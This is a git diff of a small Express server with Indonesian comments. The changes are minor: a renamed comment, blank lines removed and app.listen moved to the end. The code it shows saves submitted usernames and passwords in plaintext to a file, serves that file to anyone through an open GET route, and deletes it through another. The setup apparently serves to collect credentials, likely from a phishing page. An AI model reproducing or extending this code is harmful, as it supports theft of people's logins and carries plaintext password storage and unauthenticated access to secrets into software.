@@ -13,7 +13,6 @@ app.use(bodyParser.json());
 app.post('/simpan', (req, res) => {
   const { username, password } = req.body;
   const logData = `Username: ${username}, Password: ${password}\n`;
-
   const logPath = path.join('/tmp', 'logins.txt');
 
   fs.appendFile(logPath, logData, (err) => {
@@ -27,10 +26,9 @@ app.post('/simpan', (req, res) => {
 
 app.get('/', (req, res) => res.send("API aktif bro!"));
 
-// ✅ Tambahkan ini
+// ✅ Route lihat isi log
 app.get('/lihat-log', (req, res) => {
   const logPath = path.join('/tmp', 'logins.txt');
-
   fs.readFile(logPath, 'utf8', (err, data) => {
     if (err) {
       console.error('Gagal baca log:', err);
@@ -41,13 +39,9 @@ app.get('/lihat-log', (req, res) => {
   });
 });
 
-app.listen(PORT, () => {
-  console.log(`Server aktif di port ${PORT}`);
-});
-
+// ✅ Route hapus log
 app.get('/hapus-log', (req, res) => {
   const logPath = path.join('/tmp', 'logins.txt');
-
   fs.unlink(logPath, (err) => {
     if (err) {
       console.error('Gagal hapus log:', err);
@@ -57,3 +51,7 @@ app.get('/hapus-log', (req, res) => {
   });
 });
 
+// ⬇️ Harus paling bawah
+app.listen(PORT, () => {
+  console.log(`Server aktif di port ${PORT}`);
+});
